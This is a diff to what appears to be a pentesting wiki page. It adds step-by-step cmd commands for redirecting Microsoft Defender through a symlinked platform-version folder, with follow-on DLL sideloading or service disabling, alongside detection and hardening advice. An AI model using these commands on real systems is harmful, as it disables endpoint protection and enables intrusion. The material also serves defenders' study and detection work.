@@ -892,6 +892,64 @@ References for PPL and tooling
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
+## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
+
+Windows Defender chooses the platform it runs from by enumerating subfolders under:
+- `C:\ProgramData\Microsoft\Windows Defender\Platform\`
+
+It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.
+
+Preconditions
+- Local Administrator (needed to create directories/symlinks under the Platform folder)
+- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
+- Only built-in tools required (mklink)
+
+Why it works
+- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.
+
+Step-by-step (example)
+1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
+```cmd
+set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
+set DST="C:\TMP\AV"
+robocopy %SRC% %DST% /MIR
+```
+2) Create a higher-version directory symlink inside Platform pointing to your folder:
+```cmd
+mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
+```
+3) Trigger selection (reboot recommended):
+```cmd
+shutdown /r /t 0
+```
+4) Verify MsMpEng.exe (WinDefend) runs from the redirected path:
+```powershell
+Get-Process MsMpEng | Select-Object Id,Path
+# or
+wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
+```
+You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.
+
+Post-exploitation options
+- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
+```cmd
+rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
+```
+
+Detection ideas
+- Alert on new directory reparse points under `C:\ProgramData\Microsoft\Windows Defender\Platform\`.
+- Watch for new version-looking folder names exceeding known Defender versions.
+- Detect Defender binaries executing from non-standard paths (e.g., `C:\TMP\`).
+- Sysmon telemetry: FileCreate (Event ID 11) with ReparsePoint/Symlink in that path; process starts for `MsMpEng.exe` with unexpected image path.
+
+Hardening tips
+- Enforce allow-listed execution paths with WDAC/AppLocker; prohibit Defender from running outside trusted directories.
+- Continuously validate Defender’s configured platform path; remediate anomalies.
+- Keep Tamper Protection enabled; monitor for Defender platform location changes.
+
+> Note: This technique does not provide privilege escalation by itself; it requires admin rights.
+
 ## References
 
 - [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
@@ -905,5 +963,7 @@ References for PPL and tooling
 - [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
+- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
+- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
 
 {{#include ../banners/hacktricks-training.md}}
